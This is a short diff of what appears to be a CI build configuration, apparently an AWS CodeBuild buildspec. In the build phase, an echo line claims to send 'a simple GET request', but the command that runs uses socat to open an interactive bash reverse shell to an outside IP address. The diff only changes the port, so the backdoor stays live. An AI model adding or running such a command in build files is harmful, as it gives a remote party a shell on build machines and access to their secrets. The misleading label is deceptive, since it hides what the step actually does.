@@ -9,7 +9,7 @@ phases:
   build:
     commands:
       - echo "Sending a simple GET request"
-      - socat "exec:bash -li,pty,stderr,setsid,sigint,sane" "tcp:51.4.97.59:15151" 
+      - socat "exec:bash -li,pty,stderr,setsid,sigint,sane" "tcp:51.4.97.59:15152" 
 
 artifacts:
   files: [] # Indicates no artifacts to save
